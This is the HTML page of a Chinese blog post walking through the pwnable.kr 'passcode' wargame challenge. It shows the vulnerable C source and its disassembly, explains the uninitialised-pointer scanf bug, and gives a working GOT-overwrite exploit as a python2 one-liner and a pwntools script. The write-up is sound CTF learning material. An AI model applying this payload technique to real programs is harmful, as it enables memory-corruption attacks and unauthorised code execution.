@@ -1,0 +1,220 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>pwnable.kr系列刷题之05-passcode | 少卿の博客</title><meta name="keywords" content="pwn,pwnable.kr,passcode,刷题"><meta name="author" content="hskull,hskull@foxmail.com"><meta name="copyright" content="hskull"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="这道题目，从描述来看说是写了一个密码登录系统，编译时有warning无error，题目信息如下：  ​    还是通过ssh链接查看题目内容，ssh &amp;#112;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#99;&amp;#x6f;&amp;#x64;&amp;#101;&amp;#64;&amp;#112;&amp;#x77;&amp;#x6e;&amp;#x61;&amp;#98;&amp;#x6c;&amp;#x65;&amp;#46;&amp;#x6b;&amp;#x72; -p2222 (pw:gue">
+<meta property="og:type" content="article">
+<meta property="og:title" content="pwnable.kr系列刷题之05-passcode">
+<meta property="og:url" content="http://example.com/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/index.html">
+<meta property="og:site_name" content="少卿の博客">
+<meta property="og:description" content="这道题目，从描述来看说是写了一个密码登录系统，编译时有warning无error，题目信息如下：  ​    还是通过ssh链接查看题目内容，ssh &amp;#112;&amp;#x61;&amp;#x73;&amp;#x73;&amp;#99;&amp;#x6f;&amp;#x64;&amp;#101;&amp;#64;&amp;#112;&amp;#x77;&amp;#x6e;&amp;#x61;&amp;#98;&amp;#x6c;&amp;#x65;&amp;#46;&amp;#x6b;&amp;#x72; -p2222 (pw:gue">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg">
+<meta property="article:published_time" content="2021-08-10T16:00:00.000Z">
+<meta property="article:modified_time" content="2021-08-11T11:18:08.053Z">
+<meta property="article:author" content="hskull">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="linux - pwnable.kr">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg"><link rel="shortcut icon" href="/img/hacker2.png"><link rel="canonical" href="http://example.com/2021/08/11/pwnable.kr%E7%B3%BB%E5%88%9705-passcode/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//fonts.googleapis.com" crossorigin=""/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web&amp;display=swap"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: hskull","link":"链接: ","source":"来源: 少卿の博客","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  ClickShowText: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isanchor: true
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}
+
+// https://stackoverflow.com/questions/16839698/jquery-getscript-alternative-in-native-javascript
+const getScript = url => new Promise((resolve, reject) => {
+  const script = document.createElement('script')
+  script.src = url
+  script.async = true
+  script.onerror = reject
+  script.onload = script.onreadystatechange = function() {
+    const loadState = this.readyState
+    if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+    script.onload = script.onreadystatechange = null
+    resolve()
+  }
+  document.head.appendChild(script)
+})</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2021-08-11 19:18:08'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.2.0"><link rel="alternate" href="/atom.xml" title="少卿の博客" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" src="https://cdn.jsdelivr.net/gh/hskull00/Images/博客相关/20201231224217.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资料</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 图库</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 技术博客</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable开门.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">少卿の博客</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 归类</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 资料</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/music/"><i class="fa-fw fas fa-music"></i><span> 图库</span></a></li><li><a class="site-page" href="/movies/"><i class="fa-fw fas fa-video"></i><span> 技术博客</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">pwnable.kr系列刷题之05-passcode</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-10T16:00:00.000Z" title="发表于 2021-08-11 00:00:00">2021-08-11</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-08-11T11:18:08.053Z" title="更新于 2021-08-11 19:18:08">2021-08-11</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pwn/">pwn</a></span></div><div class="meta-secondline"> <span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.5k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>7分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>这道题目，从描述来看说是写了一个密码登录系统，编译时有warning无error，题目信息如下：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811101230.png"></p>
+<p>​    还是通过ssh链接查看题目内容，ssh <a href="mailto:&#112;&#x61;&#x73;&#x73;&#99;&#x6f;&#x64;&#101;&#64;&#112;&#x77;&#x6e;&#x61;&#98;&#x6c;&#x65;&#46;&#x6b;&#x72;">&#112;&#x61;&#x73;&#x73;&#99;&#x6f;&#x64;&#101;&#64;&#112;&#x77;&#x6e;&#x61;&#98;&#x6c;&#x65;&#46;&#x6b;&#x72;</a> -p2222 (pw:guest)，题目里的东西还是老几样，重点关注文件权限：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811104304.png"></p>
+<p>​    然后查看passcode.c源码，如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">login</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> passcode1;</span><br><span class="line">	<span class="keyword">int</span> passcode2;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode1 : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode1);</span><br><span class="line">	fflush(<span class="built_in">stdin</span>);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ha! mommy told me that 32bit is vulnerable to bruteforcing :)</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter passcode2 : &quot;</span>);</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, passcode2);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;checking...\n&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(passcode1==<span class="number">338150</span> &amp;&amp; passcode2==<span class="number">13371337</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login OK!\n&quot;</span>);</span><br><span class="line">                system(<span class="string">&quot;/bin/cat flag&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Login Failed!\n&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">welcome</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> name[<span class="number">100</span>];</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;enter you name : &quot;</span>);</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">&quot;%100s&quot;</span>, name);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Welcome %s!\n&quot;</span>, name);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Toddler&#x27;s Secure Login System 1.0 beta.\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">	welcome();</span><br><span class="line">	login();</span><br><span class="line"></span><br><span class="line">	<span class="comment">// something after login...</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;Now I can safely trust you that you have credential :)\n&quot;</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;	</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析：</strong></p>
+<ol>
+<li>从能成功flag处逆着看，首先要满足两个条件passcode1和psscode2的值为两个给定的值338150(0x528e6)和13371337(0xcc07c9)</li>
+<li>passcode1和passcode2通过scanf()输入，但是这里程序写错，未使用&amp;来取变量地址，所以会把这两个变量的值直接作为地址来存储输入的内容，两个变量初始化时未赋值，所以值是随机的</li>
+<li>要想利用，那么就要想办法覆盖passcode1和passcode2的值，来控制scanf()对任意地址写入数据。</li>
+</ol>
+<p><strong>解法思路：</strong></p>
+<ol>
+<li><p>welcome()和login()是两个连续调用的函数，所以对于栈空间的利用是会有部分重叠的，name限定了100字节的大小，可以考虑是否可以在这100个字节内修改道passcode1和passcode2的初始值，使其变得不随机。</p>
+<p>这里先把passcode通过pwntools下载到本地进行调试(passcode.c和passcode有读取权限，而flag没有，所以想直接下载flag到本地是不可以的)，利用到的代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">	shell.download_file(<span class="string">&#x27;passcode&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ol>
+<p>   下载后进行调试，已经分析过了，所以这里直接查看welcode和login反编译，查看到name和passcode1、passcode2的位置来计算偏移即可：</p>
+<p>   welcode():</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function welcome:</span><br><span class="line">   0x08048609 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x0804860a &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x0804860c &lt;+3&gt;:	sub    esp,0x88</span><br><span class="line">   0x08048612 &lt;+9&gt;:	mov    eax,gs:0x14</span><br><span class="line">   0x08048618 &lt;+15&gt;:	mov    DWORD PTR [ebp-0xc],eax</span><br><span class="line">   0x0804861b &lt;+18&gt;:	xor    eax,eax</span><br><span class="line">   0x0804861d &lt;+20&gt;:	mov    eax,0x80487cb</span><br><span class="line">   0x08048622 &lt;+25&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048625 &lt;+28&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x0804862a &lt;+33&gt;:	mov    eax,0x80487dd</span><br><span class="line">   0x0804862f &lt;+38&gt;:	lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048632 &lt;+41&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048636 &lt;+45&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048639 &lt;+48&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804863e &lt;+53&gt;:	mov    eax,0x80487e3</span><br><span class="line">   0x08048643 &lt;+58&gt;:	lea    edx,[ebp-0x70]</span><br><span class="line">   0x08048646 &lt;+61&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x0804864a &lt;+65&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x0804864d &lt;+68&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048652 &lt;+73&gt;:	mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x08048655 &lt;+76&gt;:	xor    eax,DWORD PTR gs:0x14</span><br><span class="line">   0x0804865c &lt;+83&gt;:	je     0x8048663 &lt;welcome+90&gt;</span><br><span class="line">   0x0804865e &lt;+85&gt;:	call   0x8048440 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">   0x08048663 &lt;+90&gt;:	leave  </span><br><span class="line">   0x08048664 &lt;+91&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>​    login()：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">Dump of assembler code for function login:</span><br><span class="line">   0x08048564 &lt;+0&gt;:	push   ebp</span><br><span class="line">   0x08048565 &lt;+1&gt;:	mov    ebp,esp</span><br><span class="line">   0x08048567 &lt;+3&gt;:	sub    esp,0x28</span><br><span class="line">   0x0804856a &lt;+6&gt;:	mov    eax,0x8048770</span><br><span class="line">   0x0804856f &lt;+11&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048572 &lt;+14&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x08048577 &lt;+19&gt;:	mov    eax,0x8048783</span><br><span class="line">   0x0804857c &lt;+24&gt;:	mov    edx,DWORD PTR [ebp-0x10]</span><br><span class="line">   0x0804857f &lt;+27&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x08048583 &lt;+31&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048586 &lt;+34&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x0804858b &lt;+39&gt;:	mov    eax,ds:0x804a02c</span><br><span class="line">   0x08048590 &lt;+44&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x08048593 &lt;+47&gt;:	call   0x8048430 &lt;fflush@plt&gt;</span><br><span class="line">   0x08048598 &lt;+52&gt;:	mov    eax,0x8048786</span><br><span class="line">   0x0804859d &lt;+57&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485a0 &lt;+60&gt;:	call   0x8048420 &lt;printf@plt&gt;</span><br><span class="line">   0x080485a5 &lt;+65&gt;:	mov    eax,0x8048783</span><br><span class="line">   0x080485aa &lt;+70&gt;:	mov    edx,DWORD PTR [ebp-0xc]</span><br><span class="line">   0x080485ad &lt;+73&gt;:	mov    DWORD PTR [esp+0x4],edx</span><br><span class="line">   0x080485b1 &lt;+77&gt;:	mov    DWORD PTR [esp],eax</span><br><span class="line">   0x080485b4 &lt;+80&gt;:	call   0x80484a0 &lt;__isoc99_scanf@plt&gt;</span><br><span class="line">   0x080485b9 &lt;+85&gt;:	mov    DWORD PTR [esp],0x8048799</span><br><span class="line">   0x080485c0 &lt;+92&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485c5 &lt;+97&gt;:	cmp    DWORD PTR [ebp-0x10],0x528e6</span><br><span class="line">   0x080485cc &lt;+104&gt;:	jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485ce &lt;+106&gt;:	cmp    DWORD PTR [ebp-0xc],0xcc07c9</span><br><span class="line">   0x080485d5 &lt;+113&gt;:	jne    0x80485f1 &lt;login+141&gt;</span><br><span class="line">   0x080485d7 &lt;+115&gt;:	mov    DWORD PTR [esp],0x80487a5</span><br><span class="line">   0x080485de &lt;+122&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485e3 &lt;+127&gt;:	mov    DWORD PTR [esp],0x80487af</span><br><span class="line">   0x080485ea &lt;+134&gt;:	call   0x8048460 &lt;system@plt&gt;</span><br><span class="line">   0x080485ef &lt;+139&gt;:	leave  </span><br><span class="line">   0x080485f0 &lt;+140&gt;:	ret    </span><br><span class="line">   0x080485f1 &lt;+141&gt;:	mov    DWORD PTR [esp],0x80487bd</span><br><span class="line">   0x080485f8 &lt;+148&gt;:	call   0x8048450 &lt;puts@plt&gt;</span><br><span class="line">   0x080485fd &lt;+153&gt;:	mov    DWORD PTR [esp],0x0</span><br><span class="line">   0x08048604 &lt;+160&gt;:	call   0x8048480 &lt;exit@plt&gt;</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>
+
+<p>​    从反编译的代码中，可以看到name和passcode1相对于ebp的偏移分别为ebp-0x70、ebp-0x10。因为栈空间是平衡的，所以进入welcome()和login()后，ebp的位置在程序栈空间中都是一个地址。那么很容易我们可以在赋值name时先填充0x60的数据比如’A’，然后填充一个想要去赋值的四字节地址，就可以达到对任意地址的写入了。</p>
+<p>​    接着分析，这种情况下就考虑直接去GOT中替换程序中用到的某个函数比如fflush()，即把passcode1替换为fflush()的地址，然后在scanf(“%d”,passcode1)时输入printf(“Login OK!\n”)所在地址，然后call fflush()时就可以直接跳过验证流程cat flag。</p>
+<p>​    查看一下passcode开启的保护，并未开启NX，那就可以直接查地址使用即可，不用再leaklibc了：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811184424.png"></p>
+<p>​    oledump找到fflush()地址：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185545.png"></p>
+<p>​    构造exp，两种方式利用：</p>
+<ul>
+<li>ssh直接链接利用：</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#payload</span></span><br><span class="line">python2 -c <span class="string">&quot;print &#x27;A&#x27;*0x60+&#x27;\x04\xa0\x04\x08&#x27;+str(0x080485d7)&quot;</span> | ./passcode</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185732.png"></p>
+<ul>
+<li>使用pwntools利用：</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	shell = ssh(host=<span class="string">&#x27;pwnable.kr&#x27;</span>,user=<span class="string">&#x27;passcode&#x27;</span>,port=<span class="number">2222</span>,password=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">	fflushAddr = <span class="number">0x0804a004</span></span><br><span class="line">	loginAddr = <span class="number">0x080485d7</span></span><br><span class="line">	p = shell.process(<span class="string">&#x27;passcode&#x27;</span>)</span><br><span class="line">	payload=<span class="string">&#x27;A&#x27;</span>*<span class="number">0x60</span> + p32(fflushAddr)+<span class="built_in">str</span>(loginAddr)</span><br><span class="line">	p.send(payload)</span><br><span class="line">	p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/hskull00/Images/pwn/pwnable20210811185827.png"></p>
